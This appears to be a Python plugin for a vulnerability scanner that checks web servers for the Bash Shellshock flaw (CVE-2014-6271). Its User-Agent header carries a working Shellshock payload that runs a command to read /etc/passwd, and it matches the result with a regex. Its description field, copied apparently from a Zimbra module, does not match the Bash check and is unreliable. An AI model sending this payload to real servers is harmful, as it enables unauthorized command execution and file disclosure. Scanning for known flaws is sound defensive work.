# -*- coding: utf-8 -*-
#!/usr/bin/python
import sys
sys.path.append("../../../")

import lib.core#上级目录中的模块
global info
info = {
          'Name' : 'bash进程任意命令执行',
          'Description' : 'Zimbra是流行的邮件系统，存在任意文件读取漏洞，最终可能导致命令执行。',
          'Author' : 'LubyRuffy',
          'Product' : 'Bash',
          'Homepage' : 'http://gnu.org/',
          'References' : 'CVE-2014-6271',
          'DisclosureDate' : '2014-09-11',
          'ScanSteps' :
              [
                {
                  'Request':
                     {
                        'method' : 'GET',
                        'uri' : '/cgi-bin/cmo_cmo.sh',
                        'header' : {'User-Agent':'() { :;};echo -e "Content-type:text/html\r\n\r\n`/usr/bin/less /etc/passwd`"'}
                     },
                  'ResponseTest' : {
                      'type' : 'group',
                      'operator' : 'AND',
                      'checks' : [
                        {
                            'type' : 'item',
                            'varibale' : '$code',
                            'operator' : '==',
                            'value' : '200'
                        },
                        {
                            'type' : 'group',
                            'operator': 'OR',
                            'checks' : [
                                {
                                    'type' : 'item',
                                    'varibale' : '$head',
                                    'operator' : 'regex',
                                    'value' : "\S*:\S*:\S*:\S*:\S*:\S*:\S*"
                                },
                                {
                                    'type' : 'item',
                                    'varibale' : '$body',
                                    'operator' : 'regex',
                                    'value' : "\S*:\S*:\S*:\S*:\S*:\S*:\S*"
                                }
                            ]
                        }
                      ]
                  }
                }
              ]
      }
class tsExploits(lib.core.Exploit):
  """docstring for tsExploits"""
  def __init__(self):      
      super(tsExploits, self).__init__(info)


  def vulnerable(self,hostinfo):
    if info['ScanSteps']:
      if super(tsExploits,self).vulnerable(hostinfo):
        return True
       
  def exploit(self,hostinfo):
    pass
    #http://www.2cto.com/Article/201312/265706.html
    #http://www.exploit-db.com/sploits/zimbraexploit_rubina119.zip

if __name__=='__main__':
  pass
else:
  global exp
  exp = tsExploits()
